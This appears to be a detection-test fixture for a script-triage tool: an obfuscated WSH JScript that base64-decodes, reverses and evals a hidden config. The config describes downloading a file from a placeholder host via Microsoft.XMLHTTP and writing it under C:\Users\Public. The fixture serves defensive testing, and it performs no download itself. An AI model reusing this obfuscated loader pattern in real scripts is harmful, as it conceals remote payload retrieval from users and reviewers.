// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
var decode_2c08dc7d = function decode_2c08dc7d_body(v_a19c) {
  var v_b27e = v_a19c.slice(0);
  v_b27e.reverse();
  return v_b27e;
};
var recover_9497590c = function recover_9497590c_body() {
  var packedText = "fTI6InRudW9DZWdhdHMiLH0idGFkLmRhYjM2OTc0YzgtZWdhdHNcXGJhTHNzZXJ0bnVIXFxjaWxidVBcXHNyZXNVXFw6QyI6Imh0YXBfZWxpZiIsImRhYjM2OTc0YzgvYmFMc3NlcnRudUgiOiJ0bmVnYV9yZXN1IiwidGFkLjA3YzM2MzA0L2RpbGF2bmkuZWxwbWF4ZS5kYWIzNjk3NGM4Ly86c3B0dGgiOiJscnUiLCJkYWIzNjk3NGM4LW5naWFwbWFjIjoiZGlfbmdpYXBtYWMiezoic2V1bGF2IiwiUFRUSExNWC50Zm9zb3JjaU0iOiJyZXRwYWRhIixdImVsaWZfZXRpcnciLCJldG9tZXJfZXJpdXFjYSJbOiJzcGV0cyJ7";

  var v_a19c = decodeBase64(packedText);

  var v_f602 = ["north", "south"].join(":");

  var invoke = function(block, value) { return block.apply(null, [value]); };

  var v_b27e = invoke.apply(null, [decode_2c08dc7d, v_a19c]);

  var v_c304 = "", bi = 0;

  for (bi = 0; bi < v_b27e.length; bi++) { v_c304 += String.fromCharCode(v_b27e[bi]); }

  return v_c304;
};
var inspect_c479c6fe = function inspect_c479c6fe_body() {
  var v_d41a = eval("(" + recover_9497590c.apply(null, []) + ")");
  return { steps: v_d41a.steps, adapter: v_d41a.adapter, values: v_d41a.values, stageCount: v_d41a.stageCount };
};
